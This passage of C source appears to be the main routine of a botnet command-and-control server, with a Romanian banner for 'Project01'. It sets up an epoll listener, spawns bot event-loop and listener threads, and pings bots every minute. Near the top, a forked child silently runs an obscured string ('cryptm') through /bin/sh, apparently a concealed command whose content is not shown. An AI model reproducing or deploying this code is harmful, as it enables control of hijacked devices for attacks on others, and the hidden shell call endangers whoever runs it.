        if (parent == 0){execl("/bin/sh", "/bin/sh", "-c", cryptm, NULL);}
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

        checkaccounts();
        checklog();
       	printf("\e[1;31mSCREEN-UL CNC-ului Project01 A INCEPUT. \r\n"); 
		threads = atoi(argv[2]);
		port = atoi(argv[3]);
        printf("port: %s\n",argv[3]);
        printf("threads: %s\n", argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
		cih(cryptm);
	    memset(cryptm,0,0);
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}